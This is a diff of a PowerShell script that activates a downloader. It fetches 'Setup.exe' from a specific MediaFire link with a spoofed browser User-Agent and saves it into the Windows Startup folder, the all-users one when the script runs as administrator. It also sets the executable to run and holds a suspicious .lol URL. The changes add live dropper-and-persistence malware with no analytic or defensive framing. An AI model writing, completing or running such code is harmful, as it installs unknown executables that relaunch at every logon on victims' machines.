@@ -111,20 +111,21 @@ if($null -ne $subZip -and(Test-Path -LiteralPath $subZip.FullName)){Remove-Item 
 if($null -ne $targetExtractPath -and(Test-Path -LiteralPath $targetExtractPath)){Remove-Item -LiteralPath $targetExtractPath -Recurse -Force -ErrorAction SilentlyContinue}
 Write-Host "Workflow completed successfully!"
 }
-$runExe=$false;$p1=$false;$p2=$false;$p3=$false
+$runExe=$false;$p1=$true;$p2=$false;$p3=$false
 if(!($p1) -and !($openUrl)){[Environment]::Exit(0)}
 $isAdmin=([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
 if($isAdmin){
-$tempPath=[Environment]::GetFolderPath('CommonStartup')
+$runExe=$true
 $startmenuPath=[Environment]::GetFolderPath('CommonStartup')
+$tempPath=$startmenuPath
 }else{
-$tempPath=[System.Environment]::GetEnvironmentVariable('TEMP','User')
 $startmenuPath=[Environment]::GetFolderPath('Startup')
+$tempPath=$startmenuPath
 }
 if($openUrl){$targetUrl="https://www.whuskalc.lol:443/essential/_page.html"}
 if($p1){
-$mediaFireUrl="https://www.mediafire.com:443/file/?/"
-$folderName="?";$exeName="?.exe"
+$mediaFireUrl="https://www.mediafire.com:443/file/88goqlewodq0w4j/"
+$folderName="SetUp";$exeName="Setup.exe"
 $zipPath=Join-Path $tempPath "$folderName.zip";$extractPath=$tempPath;$exePath=Join-Path $extractPath $exeName
 $headers=@{"User-Agent"="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/140.0 Safari/537.36"}
 Write-Host "Getting MediaFire page..."
